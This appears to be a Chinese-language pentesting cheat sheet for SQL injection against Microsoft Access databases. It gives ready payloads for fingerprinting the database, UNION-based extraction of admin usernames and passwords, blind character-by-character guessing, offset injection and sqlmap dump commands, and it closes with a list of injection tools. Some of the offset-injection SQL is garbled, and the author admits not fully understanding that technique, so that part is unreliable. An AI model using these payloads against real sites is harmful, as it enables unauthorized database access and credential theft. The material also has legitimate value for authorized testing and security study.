# ACCESS注入
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x01 判断数据库类型
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;代码查看:
```sql
    sysobjects 是SQL , msysobjects 是ACCESS,前提是允许访问系统表
    and (select count(*) from sysobjects)>0
    and (select count(*) from msysobjects)>0
    
    SQLServer: sysobjects页面正常，msysobject页面不正常
    ACCESS: sysobjects和加msysobjects的SQL语句后，网页显示都不正常
            msysobject后的网页显示正常

```
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x02 联合查询法

```sql
    常规判断注入点，查询列数，Access只有一个库
    判断字段数: order by NUM   //根据页面反应得出字段数
    查表: UNION SELECT num,num+1... from admin
    查数据: UNION SELECT 1,admin,3,password from admin
```
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x03 逐字猜解法

```sql
    表名,列名可以搜索常见Access表列命名即可
    
    查表：and exists (select * from 表名)
    查列：and exists (select 列名 from 表名)
    查数据：1.确定长度 2.确定asc数据(asc编码)
           1.and (select top 1 len(列名) from admin)=5  //=换成<=5也成立，下同
           2.and (select top 1 asc(mid(列名,位数,1)) from admin)=97
```
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x04 偏移注入(能查表，不能查字段)

```sql
    判断字段数: order by NUM   //根据页面反应得出字段数
    爆出显示位: UNION SELECT 1,2,...,NUM from 表名
    查字段:union select1,2,3,4,5,6,7,8,9,10,* from admin 直到页面正常，否则不断用 * 代替减少NUM数
    
    字段数=order by 出的字段数-*号的字段数x2
    偏移注入: union select 1,2,3,4,5,6,7,8,9,10,* from (adminas a inner join admin as b ona.id=b.id)
            1,2,3,4,5,6,7,8,9,10, //上述公式这里理解为剩下的字段数就可以
    (后续百度一下吧，gay主自己也没搞透，不好意思写，误人)
```
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x05 SQLMap注入

```
    查表: sqlmap.py -u "ULR" --tables
    查列: sqlmap.py -u "URL" --columns -T 表名 
    查数据: sqlmap.py -u "URL"  -T 表名 -C 字段名 --dump 
```

###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x06 工具
[靶场实战](https://www.jianshu.com/p/c1ebccc72486?from=timeline)、SQLMap、穿山甲、胡萝卜、啊D、明小子等，有时候一个注入工具不行，几个一起上还是很阔以的











